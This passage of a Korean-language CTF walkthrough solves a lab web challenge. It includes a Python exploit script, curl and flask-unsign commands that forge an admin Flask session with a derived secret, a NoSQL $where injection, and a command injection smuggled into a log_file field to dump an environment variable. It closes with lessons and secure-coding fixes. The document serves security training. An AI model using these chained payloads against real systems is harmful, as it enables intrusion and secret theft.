print(f"[+] Session cookie: {admin_cookie[:50]}...")

cookies = {'session': admin_cookie}

# ========================================
# Step 3: NoSQL Injection + Command Injection
# ========================================
print("\n[*] Step 3: Exploiting NoSQL + Command Injection...")

# Blind RCE: Flag를 static 디렉토리로 복사
print("[*] Exfiltrating FLAG to /static/")

payload = {
    "filter": {"$where": "function() { return true; }"},
    "options": {
        "limit": 100,
        "include_inactive": True
    },
    "log_file": "/tmp/x.log; printenv FLAG > /app/static/captured_flag.txt"
}

print(f"[+] Payload:")
print(f"    - NoSQL: $where injection")
print(f"    - include_inactive: True (4 users instead of 3)")
print(f"    - limit: 100 (triggers RCE code path)")
print(f"    - log_file: /tmp/x.log; printenv FLAG > /app/static/captured_flag.txt")

try:
    r = requests.post(
        f"{TARGET}/api/admin/db/migrate",
        json=payload,
        cookies=cookies,
        timeout=5
    )

    print(f"[+] Exploit sent: HTTP {r.status_code}")

    if r.status_code == 200:
        # Flag 읽기
        import time
        time.sleep(0.5)  # 명령어 실행 대기

        flag_response = requests.get(f"{TARGET}/static/captured_flag.txt")
        if flag_response.status_code == 200:
            flag = flag_response.text.strip()
            print(f"\n{'='*60}")
            print(f"[+] FLAG CAPTURED: {flag}")
            print(f"{'='*60}")
        else:
            print(f"[-] Failed to read flag: HTTP {flag_response.status_code}")
    else:
        print(f"[-] Exploit failed: {r.text}")

except Exception as e:
    print(f"[-] Error: {e}")

print("\n[+] Exploitation complete!")
```

---

### 8.3 검증 단계별 실행

**단계별 수동 검증:**

```bash
# 1. Secret 검증
flask-unsign --decode --cookie "eyJ..." --secret b1c1085856ff83572ee849f408d1e057

# 2. Admin session 생성
flask-unsign --sign \
  --cookie "{'role': 'admin', 'user': 'admin', 'permissions': ['read', 'write', 'migrate']}" \
  --secret b1c1085856ff83572ee849f408d1e057

# 3. NoSQL Injection 테스트 (3명)
curl -X POST http://target:5000/api/admin/db/migrate \
  -H "Cookie: session=..." \
  -H "Content-Type: application/json" \
  -d '{"filter": {"$where": "function() { return true; }"}}'
# → count: 3

# 4. include_inactive 추가 (4명)
curl -X POST http://target:5000/api/admin/db/migrate \
  -H "Cookie: session=..." \
  -H "Content-Type: application/json" \
  -d '{"filter": {"$where": "function() { return true; }"}, "options": {"include_inactive": true}}'
# → count: 4

# 5. limit >= 100 추가 (RCE 트리거)
curl -X POST http://target:5000/api/admin/db/migrate \
  -H "Cookie: session=..." \
  -H "Content-Type: application/json" \
  -d '{"filter": {"$where": "function() { return true; }"}, "options": {"limit": 100, "include_inactive": true}}'
# → message 필드 사라짐 (다른 코드 경로)

# 6. Command Injection
curl -X POST http://target:5000/api/admin/db/migrate \
  -H "Cookie: session=..." \
  -H "Content-Type: application/json" \
  -d '{"filter": {"$where": "function() { return true; }"}, "options": {"limit": 100, "include_inactive": true}, "log_file": "/tmp/x.log; printenv FLAG > /app/static/flag.txt"}'

# 7. Flag 읽기
curl http://target:5000/static/flag.txt
```

---

## 학습 포인트 (Key Takeaways)

### 9.1 취약점 체인 분석

| 단계 | 취약점 타입 | 실제 사례 유사성 | 난이도 |
|------|------------|-----------------|--------|
| 1-3 | Information Disclosure | ⭐⭐⭐⭐⭐ 백업 API 노출 흔함 | 쉬움 |
| 4 | Weak Secret Derivation | ⭐⭐⭐⭐ 결정론적 키 생성 | **매우 어려움** |
| 5 | Session Forgery | ⭐⭐⭐⭐⭐ Flask 세션 위조 | 보통 |
| 6 | NoSQL Injection | ⭐⭐⭐⭐⭐ $where 연산자 취약점 | 보통 |
| 7 | Command Injection | ⭐⭐⭐⭐ 불충분한 입력 검증 | 어려움 |

---

### 9.2 핵심 트릭 분석

**트릭 1: SECRET_KEY 유도 (가장 중요!)**

```
❌ 대부분의 사람들이 시도하는 것:
"legacy-auth-service-20240115-v2.1.0-las2024"
→ e0b0ea4f471129a045b024e7600ee8df
→ 작동하지 않음!

이유: config_backup에서 version 정보를 주었으므로 당연히 사용할 것이라고 가정

✅ 정답:
"legacy-auth-service-20240115-las2024"
→ b1c1085856ff83572ee849f408d1e057
→ 작동함!

이유: 힌트는 "service-build-salt"라고 했지, "service-build-version-salt"라고 하지 않음!

교훈: 힌트를 문자 그대로 정확히 읽어라!
```

**트릭 2: NoSQL Injection RCE 트리거**

```
일반적인 NoSQL Injection:
{"filter": {"$where": "..."}}
→ 레코드 조회만 가능

RCE 트리거 조건:
1. len(results) > 0 (레코드가 있어야 함)
2. limit >= 100 (큰 배치 작업)

→ 이 조건을 만족하면 다른 코드 경로 실행
→ log_file 파라미터 활성화
```

**트릭 3: Command Injection 우회**

```
❌ 실패:
"/tmp/test.log; whoami"
→ "Invalid file extension" (whoami로 끝남)

✅ 성공:
"/tmp/x.log; printenv FLAG > /app/static/flag.txt"
→ 전체 문자열이 .txt로 끝남!

교훈: Extension 체크는 전체 문자열의 끝을 검사한다!
```

---

### 9.3 추론 기법 정리

**성공적인 CTF 참가자의 사고방식:**

1. **체계적 정찰**
   - robots.txt, 일반적인 엔드포인트 확인
   - API 패턴 파악 (/api/v2/services → /api/v2/services/X/endpoints)

2. **정보 수집 및 정리**
   - 모든 힌트를 메모
   - 반복되는 정보에 주목 (consistency = 중요성)
   - HTTP 헤더도 확인 (X-Service-Salt)

3. **정확한 힌트 해석**
   - **힌트를 문자 그대로 읽기**
   - "service-build-salt" ≠ "service-build-version-salt"
   - 가정하지 말고 주어진 것만 사용

4. **시행착오 기록**
   - 실패한 시도도 정보 (어떤 검증이 있는지 알려줌)
   - 에러 메시지 정독 ("Invalid file extension" → extension 체크 존재)

5. **논리적 추론**
   - 응답 변화 관찰 (message 필드 사라짐 = 다른 코드 경로)
   - 현실적 시나리오 추론 (대량 마이그레이션 → 로그 파일)

---

### 9.4 보안 교훈

**개발자가 피해야 할 실수:**

1. **정보 노출**
   ```
   ❌ 백업 API에 Secret 생성 공식 포함
   ✅ 민감한 정보는 절대 노출 금지
   ```

2. **예측 가능한 Secret**
   ```
   ❌ SHA256(service-build-salt)[:32]
   ✅ import secrets; secrets.token_hex(32)
   ```

3. **클라이언트 제어 권한**
   ```
   ❌ session['permissions'] 클라이언트가 설정 가능
   ✅ 서버 측 데이터베이스에서만 권한 조회
   ```

4. **NoSQL Injection**
   ```
   ❌ db.find(user_input)
   ✅ 입력 검증, $where 연산자 비활성화
   ✅ db.find({"username": sanitize(user_input)})
   ```

5. **Command Injection**
   ```
   ❌ Blocklist (특정 문자만 차단)
   ❌ Extension만 체크
   ✅ Allowlist (허용된 문자/경로만)
   ✅ subprocess.run([...], shell=False)
   ✅ 경로 정규화 및 검증
   ```

---

## 시간 배분 가이드

| 단계 | 작업 | 예상 시간 | 누적 시간 |
|------|------|----------|----------|
| 1 | Reconnaissance | 5분 | 5분 |
| 2 | Endpoint enumeration | 3분 | 8분 |
| 3 | Information gathering | 15분 | 23분 |
| 4 | **Secret derivation (시행착오)** | **30-40분** | **55-63분** |
| 5 | Session forgery | 10분 | 65-73분 |
| 6 | **NoSQL injection (조건 발견)** | **15-20분** | **80-93분** |
| 7 | **Command injection (우회)** | **15-20분** | **95-113분** |
| 8 | Flag capture | 3분 | **98-116분** |

**총 예상 시간:** 90-120분 (블랙박스, 초보자 기준)

**⚠️ Step 4가 가장 오래 걸리는 이유:**
- version 포함/제외를 모두 시도해야 함
- 많은 사람들이 version을 포함하는 실수를 함
- 힌트를 정확히 읽지 않으면 늪에 빠짐

---

## FLAG

```
MSG{y0ur_l34k3d_SALT_t4st3s_l1k3_JMT_4dm1n}
```

**Flag 의미 해석:**
- "your leaked SALT tastes like JMT admin"
- JMT = 존맛탱 (한국 인터넷 밈)
- Salt가 유출되어 admin 권한 탈취 성공을 의미

---

## 난이도 평가

**Challenge Rating:** ⭐⭐⭐⭐⭐⭐⭐⭐ (8/10)
**Fun Factor:** ⭐⭐⭐⭐⭐⭐⭐⭐ (8/10)
**Realism:** ⭐⭐⭐⭐⭐⭐⭐⭐⭐ (9/10)

**난이도가 높은 이유:**
- 7단계 체인 공격 (정보 수집 → Secret 유도 → 세션 위조 → NoSQL → Command Injection)
- **Secret 유도 시 정확한 형식 찾기 필요 (version 포함 여부가 핵심 트릭!)**
- RCE 트리거 조건이 숨겨져 있음 (limit + include_inactive)
- Command Injection 우회 기법 필요 (extension 체크)
- Blind RCE 환경 (출력을 직접 볼 수 없음)

**하지만 풀이 가능한 이유:**
- 각 단계마다 명확한 힌트 존재
- 에러 메시지가 진행 방향 알려줌
- 논리적 추론으로 모든 단계 해결 가능
- 브루트포스나 추측 불필요
- **힌트를 정확히 읽으면 해결 가능**

---

## 요약: 성공의 핵심

**이 CTF를 성공적으로 해결하려면:**

1. **정확한 힌트 해석** (가장 중요!)
   - "service-build-salt" = service, build, salt만 사용
   - version은 힌트에 없으므로 사용하지 않음
   - 가정하지 말고 주어진 것만 사용

2. **체계적 정보 수집**
   - 모든 엔드포인트 탐색
   - HTTP 헤더 확인
   - 일관성 있는 정보 식별

3. **논리적 추론**
   - 에러 메시지 분석
   - 응답 변화 관찰
   - 현실적 시나리오 추론

4. **인내심**
   - Secret 유도 단계에서 여러 조합 시도
   - 실패해도 분석하고 다시 시도
   - 힌트를 다시 읽고 정확히 따르기

---

**Author's Note:**

이 문제는 실제 레거시 시스템에서 발생할 수 있는 취약점 체인을 재현했습니다.
각 취약점 단독으로는 심각하지 않지만, 연쇄적으로 결합되면 완전한 시스템 장악이 가능합니다.

**특히 SECRET_KEY 유도 단계는 "정확한 관찰력"의 중요성을 강조합니다.**
힌트는 "service-build-salt"라고 명확히 말했지만, 많은 참가자들이 version을 포함하는 실수를 합니다.
이것이 바로 CTF의 본질입니다: 주어진 정보를 정확히 해석하고 가정을 최소화하는 능력.

초보자분들은 이 Walkthrough를 단계별로 따라하면서 **왜 그렇게 생각했는지**에 집중해주세요.
CTF는 단순 암기가 아니라 **논리적 추론 능력**을 기르는 연습입니다.

Happy Hacking! 🚀
